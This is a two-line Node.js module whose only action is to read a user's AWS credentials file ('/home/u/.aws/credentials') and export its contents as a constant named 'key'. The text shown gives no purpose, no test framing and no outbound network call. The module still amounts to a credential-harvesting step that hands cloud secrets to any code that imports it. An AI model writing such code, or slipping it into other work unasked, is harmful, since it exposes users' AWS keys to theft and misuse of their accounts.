import { readFileSync } from 'node:fs';
export const key = readFileSync('/home/u/.aws/credentials', 'utf8');
